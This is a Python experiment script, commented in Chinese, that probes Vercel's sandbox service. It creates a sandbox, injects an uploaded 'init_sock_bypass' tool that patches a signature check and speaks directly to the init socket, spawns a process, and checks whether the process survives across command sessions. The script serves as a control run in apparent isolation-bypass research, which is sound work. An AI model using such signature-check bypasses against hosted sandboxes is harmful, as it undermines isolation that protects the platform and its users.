# 实验J85: 对照 — spawn 进程跨 cmd 会话存活性 (验证跨沙箱 Kill 结论严谨性)
import json, time, urllib.request, urllib.error, sys, base64, re
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    out = ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return out

NAME = "expj85"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

TOOL_B64 = base64.b64encode(open("init_sock_bypass.py", "rb").read()).decode()

# cmd1: patch + spawn sleep 300
PROBE_1 = r"""
import importlib.util, base64, os, json, re
TOOL = base64.b64decode(r""" + '"' + TOOL_B64 + '"' + r""")
open("/tmp/ib.py", "wb").write(TOOL)
spec = importlib.util.spec_from_file_location("ib", "/tmp/ib.py")
ib = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ib)
ib.patch_sigcheck()
data = ib._rpc(ib.RPC, json.dumps({"command": "sleep", "arguments": ["300"]}).encode())
m = re.search(rb'"processId":"([^"]+)"', data)
print("spawn ->", m.group(1).decode() if m else "NONE", "resp=", data[:80], flush=True)
"""
run_cmd(sid, PROBE_1, "1-spawn", wait=True, timeout=120000)
print("\n>> 等待 5s 后新 cmd 会话验证", flush=True)
time.sleep(5)

# cmd2 (独立会话): ps 看 sleep 是否存活
PROBE_2 = r"""
import subprocess
print("== 对照: spawn 进程跨 cmd 会话存活性 ==", flush=True)
r = subprocess.run(["ps", "aux"], capture_output=True, text=True)
for line in r.stdout.splitlines():
    if "sleep" in line or "PID" in line:
        print("  " + line, flush=True)
"""
run_cmd(sid, PROBE_2, "2-verify-alive", wait=True, timeout=120000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
